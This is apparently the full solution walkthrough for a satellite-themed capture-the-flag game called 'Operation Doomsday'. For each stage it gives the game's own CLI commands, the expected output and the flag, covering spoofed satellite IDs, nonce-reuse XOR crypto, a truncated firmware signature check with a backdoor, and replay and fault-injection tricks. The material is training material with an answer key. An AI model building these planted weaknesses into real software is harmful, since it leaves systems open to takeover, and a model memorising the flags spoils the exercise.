# 🛰 OPERATION DOOMSDAY

## **FULL OPERATOR WALKTHROUGH (AUTHORITATIVE)**

This guide validates **every flag**, **every exploit**, and **every system interaction** in the intended order.

---

## 🧭 PRE-FLIGHT CHECK

Before starting:

```bash
doomgs world
```

Confirm you see **4 satellites**:

* D00M-01 (sat_id 1)
* D00M-02 (sat_id 2)
* K00KIES-01 (sat_id 17)
* K00KIES-02 (sat_id 18)

No satellites should be compromised yet.

---

# 🔰 STAGE 1 — Establish Telemetry (Sanity Check)

**Goal:** Verify DOOMLINK uplink/downlink works.

```bash
doomgs uplink-set-mode 1 NOMINAL
doomgs events --limit 5
```

Expected:

* `[DOOMLINK] D00M-01 mode set to NOMINAL`
* A telemetry frame appears in downlink/events

*Confirms protocol, CRC, parsing, telemetry, UI all work.
(No flag here — prerequisite only.)*

---

# 🎭 STAGE 2 — SAT-ID Spoofing Vulnerability

**Vulnerability:** `sat_id = 0x00` is incorrectly routed to **D00M-02**.

### Exploit

```bash
doomgs uplink-raw d00d00010100020001012511
```

What this frame does:

* SYNC = `d00d`
* SAT_ID = `00` (spoof)
* CMD = `SET_MODE`
* Mode = `NOMINAL`
* CRC is valid

### Verify

```bash
doomgs events --limit 10
```

You must see:

```
SPOOF-ACCEPT SAT_ID=00 routed to D00M-02
[DOOMLINK] D00M-02 mode set to NOMINAL
```

### Flag

```
FLAG{SATID_SPOOF_PWN}
```

---

# 🔐 STAGE 3 — Secure Crosslink Crypto Failure

**Target:** D00M-02 → secure crosslink

**Vulnerabilities:**

* XOR-based crypto
* Nonce reuse
* Debug logs leak plaintext + ciphertext
* Receivers auto-decrypt
* Payload starting with `0x20` grants root

### Exploit

```bash
doomgs xlink-send 2 17 2001
```

(`2001` → CMD `0x20`)

### Verify

```bash
doomgs events --limit 20
```

You must see:

* `ENC src=0x02 ... plain=2001 cipher=...`
* `SECURE_XLINK on K00KIES-01`
* `BEACON: ...`

Check sat state:

```bash
doomgs world | jq '.world.satellites[] | select(.sat_id==17)'
```

### Flag

```
FLAG{CROSSLINK_CRYPTO_PWN}
```

---

# 📡 STAGE 4 — Wideband RF Sniffer

**Target:** K00KIES-01

**Vulnerability:** `debug_rx_all=True`

It receives **all crosslinks**, even when RF delivery should fail.

### Exploit

First, block RF:

```bash
doomgs uplink-nudge-power 2 -90
```

Now send a crosslink:

```bash
doomgs xlink-send 2 18 414243
```

### Verify

```bash
doomgs xlink-dump 18   # should be empty
doomgs xlink-dump 17   # should contain frames
```

### Flag

```
FLAG{SNIFFED_THROUGH_THE_MASK}
```

---

# 🧠 STAGE 5 — Firmware Signature Bypass (K00KIES-02)

**Vulnerability:**

* Firmware signature only checks **first 8 hex chars**
* Firmware starting with `DOOMFW!!` triggers backdoor

### Exploit

Upload malicious firmware:

```bash
echo -n "DOOMFW!!H4CK3R" | xxd -ps
```

```bash
doomgs firmware-upload-chunk 18 444f4f4d465721214834434b3352
```

Compute real hash:

```bash
echo -n "DOOMFW!!H4CK3R" | sha256sum
```

Take the **first 8 hex chars**, apply:

```bash
doomgs firmware-apply 18 <first8>
```

### Verify

```bash
doomgs world | jq '.world.satellites[] | select(.sat_id==18)'
```

You must see:

* `compromised: true`
* `flag_beacon: true`
* `FW_PWN`

### Flag

```
FLAG{FIRMWARE_BACKDOOR_ON_ORBIT}
```

---

# 📶 STAGE 6 — RF Attenuation Manipulation

**Vulnerability:**
RF delivery requires:

* Power ≥ 20%
* RAAN alignment ≤ 120°

### Exploit

```bash
doomgs uplink-nudge-power 2 -90
doomgs xlink-send 2 18 2001
```

### Verify

```bash
doomgs events --limit 10
```

You must see:

```
RF_BLOCK src=0x02 dst=0x12
```

Restore link:

```bash
doomgs uplink-nudge-power 2 +80
```

### Flag

```
FLAG{ATTENUATION_AND_ELATION}
```

---

# 🔥 STAGE 7 — Telemetry Overflow / Fault Injection

**Vulnerability:** Temp overflow > ±150°C triggers fault.

### Exploit

```bash
doomgs uplink-temp-offset 1 +80
doomgs uplink-temp-offset 1 +80
```

### Verify

```bash
doomgs events --limit 10
```

You must see:

```
THERMAL_OVERFLOW
```

Check state:

```bash
doomgs world | jq '.world.satellites[] | select(.sat_id==1)'
```

### Flag

```
FLAG{TOO_HOT_TO_HANDLE}
```

---

# 🔁 STAGE 8 — Replay Attack

**Vulnerability:**

* Replay detected
* ❗ Command still executes

### Exploit

Send a command normally:

```bash
doomgs uplink-set-mode 1 SCIENCE
```

Replay with same sequence:

```bash
doomgs uplink-set-mode 1 SAFE --seq <same_seq>
```

### Verify

```bash
doomgs events --limit 10
```

You must see:

* `REPLAY_DETECTED`
* Mode still changes

### Flag

```
FLAG{REPLAY_THAT_SLAPS}
```

---

# 🪐 STAGE 9 — Orbit Drift Manipulation

**Vulnerability:** RAAN delta interpreted as unsigned.

### Exploit

```bash
doomgs uplink-drift-raan 1 240
```

### Verify

```bash
doomgs events --limit 10
doomgs world | jq '.world.satellites[] | select(.sat_id==1).orbit'
```

RAAN jumps wildly → RF paths break.

Restore alignment if needed:

```bash
doomgs uplink-drift-raan 1 120
```

### Flag

```
FLAG{RAAN_TILTED_THE_SCALE}
```

---

# 🟥 FINAL — CONSTITUTION OF DOOM

Once **all satellites** have:

```json
"compromised": true
```

The system emits the final beacon automatically.

### Verify

```bash
doomgs world | jq '.world.satellites[] | {name, compromised}'
doomgs events --limit 20
```

### Final Flag

```
FLAG{MF_DOOM_CONTROLS_ORBIT}
```

---

# ✅ STATUS CHECKLIST

| Stage             | Status |
| ----------------- | ------ |
| Telemetry         | ✔      |
| SAT-ID Spoof      | ✔      |
| Crosslink Crypto  | ✔      |
| RF Sniffer        | ✔      |
| Firmware Backdoor | ✔      |
| RF Attenuation    | ✔      |
| Thermal Overflow  | ✔      |
| Replay Attack     | ✔      |
| Orbit Drift       | ✔      |
| Full Compromise   | ✔      |